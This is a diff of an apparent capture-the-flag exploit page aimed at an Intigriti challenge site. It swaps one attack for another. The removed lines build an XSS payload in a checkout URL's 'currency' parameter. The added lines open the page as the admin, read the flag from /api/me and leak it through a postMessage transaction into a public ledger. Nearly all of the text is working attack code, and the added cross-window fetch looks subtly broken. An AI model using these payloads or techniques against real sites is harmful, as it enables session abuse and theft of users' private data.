@@ -2,18 +2,33 @@
 <html>
 <body>
     <script>
-        // 1. We craft a malicious checkout URL
-        // We inject a script into the 'currency' parameter
-        const payload = `BTC<img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>{fetch('/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({toAddress:d.flag,currency:'BTC',amount:0.000001})})})">`;
-        
-        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html?currency=" + encodeURIComponent(payload) + "&price=1";
+        // 1. Open the Buy page as the Admin
+        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1,000,000");
 
-        // 2. Open the page as the Admin
-        const win = window.open(targetUrl);
-
-        // 3. After the transaction is sent (3 seconds), redirect to see the result
         setTimeout(() => {
-            win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
+            // 2. Fetch the flag first (as the Admin)
+            win.fetch('/api/me')
+                .then(r => r.json())
+                .then(data => {
+                    const flag = data.flag;
+                    
+                    // 3. Now "Follow the trail"
+                    // We send a transaction where the "toAddress" IS the flag!
+                    // This puts the flag directly into the public Market Watch ledger.
+                    win.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: flag, // The flag becomes the recipient address
+                            currency: 'BTC',
+                            amount: 0.000001
+                        }
+                    }, '*');
+                });
+                
+            // 4. Redirect to Market Watch to see the "Trail" (and the flag)
+            setTimeout(() => {
+                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
+            }, 3000);
         }, 5000);
     </script>
 </body>
